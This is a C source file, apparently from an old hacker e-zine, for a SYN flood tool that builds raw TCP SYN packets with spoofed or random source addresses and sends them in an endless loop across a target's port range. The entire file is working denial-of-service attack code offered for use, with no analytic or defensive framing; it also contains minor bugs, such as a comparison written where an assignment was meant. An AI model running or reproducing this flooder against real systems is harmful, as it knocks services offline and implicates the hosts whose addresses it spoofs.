/* little SYN v1 alfa coded by fap for dev/ice emag*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <limits.h>

#define SHIT(n) htons(n)
#define PACKETSIZE  (sizeof(struct ip) + sizeof(struct tcphdr))   

struct ip *ip;
struct tcphdr *tcp;
struct sockaddr_in s_in;
u_char packet[PACKETSIZE];
int get;
u_long source,target;

void usage(char *name)
 {
   printf("\nUsage: %s <source addr> <dest> <lowport> <highport>\n",name);
   printf("if source=0, source address will be random\n\n");
   exit(1);
  }


u_long getaddr(char *hostname)    
  { 
    struct hostent *hp;
  
    if ((hp = gethostbyname(hostname)) == NULL) 
      {
       fprintf(stderr, "Could not resolve %s.\n", hostname);
       exit(1);
      }
    
    return *(u_long *)hp->h_addr;
  }


u_short in_cksum(u_short *addr, int len)  
  { 
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer =0;
   
   while (nleft > 1) 
      {
       sum += *w++;
       nleft -= 2;
      }
   
   if (nleft == 1) 
     {      
       *(u_char *)(&answer) = *(u_char *)w;
       sum += answer;
     }
   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

void makepacket(void)                   
{
  memset(packet, 0 , PACKETSIZE);
  
  ip = (struct ip *)packet;
  tcp = (struct tcphdr *) (packet+sizeof(struct ip));
  ip->ip_hl        = 5;
  ip->ip_v         = 4;
  ip->ip_tos       = 0;
  ip->ip_len       = SHIT(PACKETSIZE);
  ip->ip_off       = 0;
  ip->ip_ttl       = 40;
  ip->ip_p         = IPPROTO_TCP;
  ip->ip_dst.s_addr= target;
  tcp->th_flags    = TH_SYN;
  tcp->th_win      = htons(66666);
  
  s_in.sin_family  = AF_INET;
  s_in.sin_addr.s_addr = target;
 } 


void kill(u_int dstport)        
{
  if (source==0)
    ip->ip_src.s_addr = random();
  else 
    ip->ip_src.s_addr = source;
  
  ip->ip_id         = random();
  tcp->th_sport     = random();
  tcp->th_dport     = htons(dstport);
  tcp->th_seq       = random();
  tcp->th_ack       = random();
  tcp->th_sum       = in_cksum((u_short *)tcp, sizeof(struct tcphdr));
  ip->ip_sum        = in_cksum((u_short *)packet, PACKETSIZE);
  s_in.sin_port     = htons(dstport);
  
  sendto(get,packet,PACKETSIZE,0,(struct sockaddr *)&s_in,sizeof(s_in));
  //usleep(1000000);  /* Debug */
}
 

int main(int argc, char *argv[])
{ 
 int low,high,port;
 system("clear"); 
 if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) 
   {
     perror("socket");
     exit(1);
   }
 
if ((argc < 5) || (argc > 6))
   usage(argv[0]);
 system("clear"); 
 printf("\nflooding target.  control-c to terminate\n",target);

 fflush(stdout);
 if (atoi(argv[1])==0)
   source=0;
 else 
   source=getaddr(argv[1]);

 target = getaddr(argv[2]);
 low = atoi(argv[3]);
 high = atoi(argv[4]);
 
 if (low > high) {
   printf("low>high \n");
   exit(1);
   }

 if (low==high)  
  {
   makepacket();
   for (;;) {
       srandom(time(NULL));
       port==low;
       kill(port);
     }
 return 0;
   }

 makepacket();        
 for (;;) {     
   srandom(time(NULL));
   for(port = low;  port <=high; port++)
     kill(port);
  }
 return 0;
}
